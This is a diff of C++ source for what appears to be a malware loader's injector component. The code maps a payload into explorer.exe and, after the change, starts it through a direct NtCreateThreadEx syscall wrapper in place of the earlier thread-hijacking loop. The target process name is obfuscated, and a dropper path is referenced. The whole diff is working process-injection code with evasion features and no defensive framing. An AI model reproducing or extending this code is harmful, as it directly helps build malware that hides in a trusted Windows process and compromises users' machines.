@@ -171,13 +171,20 @@ DWORD Injector::GetProcessIdByName(const std::wstring& processName) {
 
 bool Injector::InjectIntoExplorer(const std::vector<uint8_t>& payload, const std::wstring& dropperPath) {
     (void)dropperPath;
-    std::wstring explorer = utils::DecryptW(L"\x3F\x22\x2A\x36\x35\x28\x3F\x28\x74\x3F\x22\x3F");
+    const wchar_t kExplorerEnc[] = { 0x3F, 0x22, 0x2A, 0x36, 0x35, 0x28, 0x3F, 0x28, 0x74, 0x3F, 0x22, 0x3F }; // explorer.exe
+    std::wstring explorer = utils::DecryptW(kExplorerEnc, 12);
     DWORD pid = GetProcessIdByName(explorer);
-    if (pid == 0) return false;
+    if (pid == 0) {
+        LOG_ERR("Inject: explorer.exe not found.");
+        return false;
+    }
 
-    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_SUSPEND_RESUME, FALSE, pid);
-    if (!hProcess) hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    if (!hProcess) return false;
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!hProcess) hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
+    if (!hProcess) {
+        LOG_ERR("Inject: OpenProcess fail. PID: " + std::to_string(pid));
+        return false;
+    }
 
     PVOID pRemoteBase = NULL;
     bool success = MapAndInject(hProcess, payload, &pRemoteBase);
@@ -187,24 +194,14 @@ bool Injector::InjectIntoExplorer(const std::vector<uint8_t>& payload, const std
         PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pSrcData + pDosHeader->e_lfanew);
         PVOID pEntryPoint = (PVOID)((PBYTE)pRemoteBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
 
-        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
-        if (hSnap != INVALID_HANDLE_VALUE) {
-            THREADENTRY32 te; te.dwSize = sizeof(te);
-            if (Thread32First(hSnap, &te)) {
-                do {
-                    if (te.th32OwnerProcessID == pid) {
-                        HANDLE hT = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
-                        if (hT) {
-                            if (HijackThread(hT, pEntryPoint)) {
-                                LOG_INFO("Inject: Hijack success on " + std::to_string(te.th32ThreadID));
-                                CloseHandle(hT); break;
-                            }
-                            CloseHandle(hT);
-                        }
-                    }
-                } while (Thread32Next(hSnap, &te));
-            }
-            CloseHandle(hSnap);
+        HANDLE hRemoteThread = NULL;
+        NTSTATUS status = SysNtCreateThreadEx(&hRemoteThread, THREAD_ALL_ACCESS, NULL, hProcess, pEntryPoint, NULL, 0, 0, 0, 0, NULL);
+        if (NT_SUCCESS(status)) {
+            LOG_INFO("Inject: NtCreateThreadEx success. TID: " + std::to_string(GetThreadId(hRemoteThread)));
+            CloseHandle(hRemoteThread);
+        } else {
+            LOG_ERR("Inject: NtCreateThreadEx fail. Status: " + utils::Shared::ToHex((unsigned long long)status));
+            success = false;
         }
     }
     CloseHandle(hProcess);
